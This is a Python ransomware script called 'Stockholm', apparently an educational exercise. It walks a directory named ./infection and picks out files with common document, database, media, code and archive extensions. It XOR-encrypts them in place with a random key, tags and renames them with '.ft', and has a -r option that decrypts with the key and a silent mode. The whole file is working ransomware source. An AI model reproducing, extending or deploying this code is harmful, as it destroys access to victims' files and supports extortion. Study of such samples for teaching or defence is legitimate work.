import hashlib
import os.path
import pathlib
import argparse
import secrets
import string
from itertools import cycle


DIRECTORY = "./infection"
KEY_TAG_SIZE = hashlib.sha256().digest_size
ALLOWED_EXTENSIONS = {
    ".123", ".7z", ".accdb", ".ai", ".asp", ".aspx", ".avi", ".bak", ".bmp",
    ".c", ".cfg", ".conf", ".cpp", ".cs", ".csv", ".db", ".dbf",
    ".doc", ".docm", ".docx", ".dwg", ".eml", ".flv", ".gif",
    ".h", ".hpp", ".html", ".java", ".jpeg", ".jpg", ".js", ".json",
    ".key", ".mdb", ".mdf", ".mov", ".mp3", ".mp4", ".mpeg", ".msg",
    ".odt", ".ost", ".pdf", ".php", ".png", ".ppt", ".pptx", ".psd",
    ".pst", ".py", ".rar", ".rtf", ".sql", ".tar", ".txt", ".vb",
    ".vbs", ".vsd", ".wav", ".wma", ".xls", ".xlsm", ".xlsx", ".xml",
    ".zip"
}

def parse_args() :
    parser = argparse.ArgumentParser(
        prog='Stockholm',
        description='Ransomware'
    )
    parser.add_argument("-r", help="reverse the infection")
    parser.add_argument("-v", '--version', help="version of the program")
    parser.add_argument("-s", "--silent", action='store_true', dest='s', help="silent mode: don't print infected files")
    args = parser.parse_args()
    return args

def read_directory(directory) :
    args = parse_args()
    try:
        files = os.listdir(directory)
    except FileNotFoundError:
        print(f"Directory not found: {directory}")
        return []

    new_files = []
    for file in files:
        full_path = os.path.join(directory, file)
        path = pathlib.Path(full_path)
        suffix = path.suffix.lower()
        # include files that are already encrypted (.ft) or match allowed extensions
        if suffix == ".ft" or suffix in ALLOWED_EXTENSIONS:
            new_files.append(full_path)
            if not args.s:
                print(full_path)
    return new_files

def print_extension(directory) :
    res = read_directory(directory)
    for file in res :
        path = pathlib.Path(file)
        print(path.suffix)

def rename_file(file) :
    path = pathlib.Path(file)
    if path.suffix != ".ft" :
        os.rename(file, file + ".ft")

def xor_file_encrypt(input_path, key):
    with open(input_path, 'rb') as f_in:
        data = f_in.read()
    
    # Conversion de la clé en bytes et répétition
    key_bytes = key.encode()
    key_cycle = cycle(key_bytes)
    
    key_tag = hashlib.sha256(key_bytes).digest()

    # XOR byte par byte
    encrypted = bytes(b ^ k for b, k in zip(data, key_cycle))
    
    with open(input_path, 'wb') as f_out:
        f_out.write(key_tag + encrypted)

def xor_file_decrypt(input_path, key):
    with open(input_path, 'rb') as f_in:
        data = f_in.read()

    # Conversion de la clé en bytes et répétition
    key_bytes = key.encode()
    if len(data) < KEY_TAG_SIZE:
        print("Erreur: Clé incorrecte!")
        exit(1)

    expected_tag = hashlib.sha256(key_bytes).digest()
    stored_tag = data[:KEY_TAG_SIZE]

    if stored_tag != expected_tag:
        print("Erreur: Clé incorrecte!")
        return
    
    # Réinitialiser le cycle pour le reste des données
    key_cycle = cycle(key_bytes)
    
    # XOR byte par byte (sauter le magic number)
    decrypted = bytes(b ^ k for b, k in zip(data[KEY_TAG_SIZE:], key_cycle))

    with open(input_path, 'wb') as f_out:
        f_out.write(decrypted)
    
    # Renommer en supprimant .ft
    path = pathlib.Path(input_path)
    if path.suffix == ".ft":
        new_name = str(path).replace(".ft", "")
        os.rename(input_path, new_name)
    


def generate_secret_key(longueur=16):
    alphabet = string.ascii_letters + string.digits
    key = ''.join(secrets.choice(alphabet) for _ in range(longueur))
    return key

def main() :
    files = read_directory(DIRECTORY)
    args = parse_args()

    if args.r :
        for file in files :
            if file.endswith(".ft") :
                xor_file_decrypt(file, args.r)
            
    else :
        key = generate_secret_key()
        print("Save your key : " + key)

        for file in files:
            xor_file_encrypt(file, key)
            rename_file(file)
    


if "__main__" == __name__ :
    main()